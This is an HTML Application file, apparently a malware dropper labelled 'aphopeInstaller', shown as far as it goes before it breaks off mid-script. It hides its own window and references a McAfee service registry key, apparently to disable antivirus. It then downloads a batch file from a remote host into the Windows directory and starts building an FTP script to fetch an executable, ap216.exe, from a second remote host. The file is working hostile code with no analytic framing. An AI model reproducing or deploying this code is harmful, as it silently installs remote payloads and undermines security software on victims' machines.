<HTML>
<SCRIPT>
self.resizeTo(0,0);
self.moveTo(3000,0); 
self.blur();
</SCRIPT>
<HTA:APPLICATION ID="aphope"
APPLICATIONNAME="aphopeInstaller"
BORDER="none"
CAPTION="no"
ICON=""
CONTEXTMENU="no"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
SCROLL="no"
SHOWINTASKBAR="no"
SINGLEINSTANCE="yes"
SELECTION="no"
INNERBORDER="no"
SYSMENU="no"
VERSION="1.0"
HEIGHT="1"
WIDTH="1"
WINDOWSTATE="normal"/>
<script language=vbscript>
Set shell=CreateObject("WScript.Shell")
Set x = CreateObject("Msxml2.XMLHTTP")
Set  WshSysEnv = shell.Environment("Process")
t = WshSysEnv("windir")
regfms ="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\McAfeeFramework\Start"
Set fso = CreateObject("Scripting.FileSystemObject")
if not fso.FileExists(t+"\\ap216.exe") Then
if not fso.FileExists(t+"\\stop.bat") Then
Set a = fso.CreateTextFile(t+"\\stop.bat",true) 
x.Open "GET", "http://vvv.goling2003.com:53/stop.bat",0
x.Send
a.write(x.responseText)
a.close
Set b = fso.CreateTextFile(t+"\\ftp.txt",true)
b.WriteLine "open ftp.goling2003.com"
b.WriteLine "bin"
b.WriteLine "get ap216.exe "